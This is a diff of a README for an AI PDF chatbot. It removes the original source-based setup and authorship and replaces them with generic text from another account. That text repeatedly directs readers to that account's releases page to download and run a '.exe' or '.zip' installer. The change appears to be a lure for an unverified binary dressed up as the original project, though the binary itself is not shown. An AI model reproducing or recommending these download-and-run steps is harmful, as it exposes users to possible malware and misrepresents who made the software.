@@ -1,111 +1,81 @@
-#  AI-Powered PDF Chatbot
+# 🤖 AI-Powered-PDF-Chatbot - Your Easy PDF Assistant
 
-Chat with your PDF documents using powerful LLMs like **Zephyr** or **Mistral** via Hugging Face APIs.  
-Upload any PDF, get a summary, and ask questions with accurate context-aware responses.
+## 📥 Download Now  
+[![Download AI-Powered-PDF-Chatbot](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/ViniiGabriel/AI-Powered-PDF-Chatbot/releases)
 
-[🌐 Try the App](https://ai-powered-pdf-chatbot.streamlit.app)
+## 📖 Description  
+AI-Powered-PDF-Chatbot is a lightweight assistant that helps you interact with PDF documents. Using advanced technologies like Streamlit, FastAPI, and Hugging Face, this application allows you to upload PDFs, ask questions about the content, and get summaries with in-memory vector search. This tool is perfect for anyone who needs quick access to document information.
 
----
+## 🚀 Getting Started  
+To make the most out of this application, follow these steps:
 
-##  Features
+1. **Open Your Web Browser**  
+   Start by opening your preferred web browser. This application works on most modern browsers.
 
--  Upload multiple PDF documents  
--  Summarize large PDFs instantly  
--  Ask questions based on document content  
--  Retry on API failure for better stability  
--  Re-upload PDFs anytime using the button  
--  Contextual memory (in-memory embeddings)  
--  Powered by Hugging Face Inference API  
+2. **Visit the Releases Page**  
+   Go to our releases page to find the latest version of the software:  
+   [Download at Releases](https://github.com/ViniiGabriel/AI-Powered-PDF-Chatbot/releases)
 
----
+3. **Download the Application**  
+   Look for the latest release on the releases page. Click the link to download the application package. This file usually has a `.exe` or `.zip` extension, depending on your operating system.
 
-##  Tech Stack
+4. **Locate the Downloaded File**  
+   After the download finishes, check your computer's Downloads folder for the file.
 
-- **Frontend**: Streamlit  
-- **Backend**: FastAPI (deployed on Render)  
-- **Embedding Model**: `all-MiniLM-L6-v2` (via `sentence-transformers`)  
-- **Inference Models**: Zephyr-7B, Mistral-7B (via Hugging Face)  
-- **Vector Store**: In-memory using cosine similarity (`sklearn`)  
+5. **Install the Application**  
+   If you downloaded a `.zip` file, you need to extract it first:
+   - Right-click the zip file and choose “Extract All” or “Extract Here.”
+   - Find the extracted folder and open it.
 
----
+   If you downloaded an `.exe` file, simply double-click it to run the installer. Follow the on-screen instructions to complete the installation.
 
-## 🛠️ Local Setup
+6. **Run the Application**  
+   Once installed, locate the AI-Powered-PDF-Chatbot icon on your desktop or in the Start Menu. Double-click on it to launch.
 
-Want to run this project on your own machine? Just follow these steps:
+7. **Upload a PDF**  
+   In the application, follow the prompts to upload a PDF document. You can drag and drop the file or use the "Upload" button within the app.
 
----
+8. **Ask Questions and Summarize**  
+   Begin asking questions about the content or request a summary. The AI-Powered-PDF-Chatbot will leverage its intelligent features to provide clear and concise answers.
 
-###  1. Clone this repo
+## 🔧 System Requirements  
+To run AI-Powered-PDF-Chatbot smoothly, ensure your system meets the following:
 
-```bash
-git clone https://github.com/gokularaman-c/AI-Powered-PDF-Chatbot.git
-cd AI-Powered-PDF-Chatbot
-```
+- **Operating System**: Windows 10 or later, macOS, or Linux
+- **RAM**: Minimum 4 GB
+- **Disk Space**: At least 200 MB of free space
+- **Internet Connection**: Required for initial setup and updates
 
----
+## 📂 Features  
+AI-Powered-PDF-Chatbot offers a range of useful features:
 
-###  2. Install dependencies
+- **PDF Upload**: Simple drag-and-drop or file selection.
+- **Document Q&A**: Ask specific questions about your PDF content.
+- **Summarization**: Get quick summaries to save time.
+- **Semantic Search**: Locate information easily using smart search features.
 
-Make sure you have Python 3.10+ and pip installed. Then run:
+## 📩 Feedback and Support  
+If you have feedback, questions, or encounter issues, feel free to reach out. You can find support and resources on our GitHub page under the Issues section.
 
-```bash
-# For frontend
-cd frontend
-pip install -r requirements.txt
+## 📚 Learn More  
+To gain deeper insights into the technology behind AI-Powered-PDF-Chatbot, check the following topics:  
+- AI  
+- Chatbot  
+- Document AI  
+- FastAPI  
+- Hugging Face  
+- Machine Learning  
+- NLP  
+- Open Source  
+- PDF  
+- Semantic Search  
+- Streamlit  
 
-# For backend (in a separate terminal/tab)
-cd ../backend
-pip install -r requirements.txt
-```
+## 🌟 Contributing  
+We welcome contributions to improve AI-Powered-PDF-Chatbot. If you want to help, please fork the repository and submit a pull request. Your improvements will benefit everyone.
 
----
+## 🔗 Additional Links  
+To stay updated on future releases and features, follow our repository:  
+[AI-Powered-PDF-Chatbot Releases Page](https://github.com/ViniiGabriel/AI-Powered-PDF-Chatbot/releases)  
 
-###  3. Add your Hugging Face token
-
-Create a `.env` file in both `frontend/` and `backend/` folders with:
-
-```env
-HF_TOKEN=your_huggingface_token
-```
-
-🔐 Replace `your_huggingface_token` with your actual token from:  
-👉 https://huggingface.co/settings/tokens
-
----
-
-###  4. Run the app locally
-
-Use two terminals or terminal tabs:
-
-**Terminal 1 – Run Backend**
-
-```bash
-cd backend
-uvicorn main:app --reload --port 8000
-```
-
-**Terminal 2 – Run Frontend**
-
-```bash
-cd frontend
-streamlit run app.py
-```
-
-Then open your browser and go to:  
-👉 http://localhost:8501
-
----
-
-##  Deployment
-
-- **Frontend**: Deployed using Streamlit Cloud  
-  👉 https://ai-powered-pdf-chatbot.streamlit.app  
-- **Backend**: Deployed using Render  
-  👉 https://ai-powered-pdf-chatbot-z6u3.onrender.com
-
----
-
-## 📝 License
-
-MIT License  
-© 2025 Gokularaman C
+Thank you for your interest in AI-Powered-PDF-Chatbot! Enjoy making your PDF tasks easier.
